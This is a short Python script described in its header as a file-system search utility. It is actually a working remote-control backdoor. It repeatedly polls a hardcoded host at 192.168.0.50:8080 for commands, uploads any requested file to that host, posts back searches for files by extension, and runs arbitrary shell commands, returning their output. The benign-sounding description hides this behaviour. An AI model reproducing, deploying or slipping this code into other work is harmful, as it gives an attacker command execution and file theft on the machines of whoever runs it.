#!/usr/bin/env python
# Filename: fs_search_and_walk.py
# This program is optimized for Python 3.4
# Description: Searches the file system for specific files and content
#   counterpart: None


import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.0.50:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.50:8080/store"
            filer = {'file': open(path, 'rb')}
            r = requests.post(url, files=filer)
        else:
            post_response = requests.post(url='http://192.168.0.50:8080', data='[-] Not able to find the file!'.encode())
    elif 'search' in command: #The Formula is search <path>*.<file extension>  -->for example let's say that we got search C:\\*.pdf
        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
        path, ext = command.split('*')
        lists = '' 
        for dirpath, dirname, files in os.walk(path):
           for file in files:
               if file.endswith(ext):
                   lists = lists + '\n' + os.path.join(dirpath, file)
        requests.post(url='http://192.168.0.50:8080', data=lists)
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.50:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.50:8080', data=CMD.stderr.read())
    time.sleep(3)

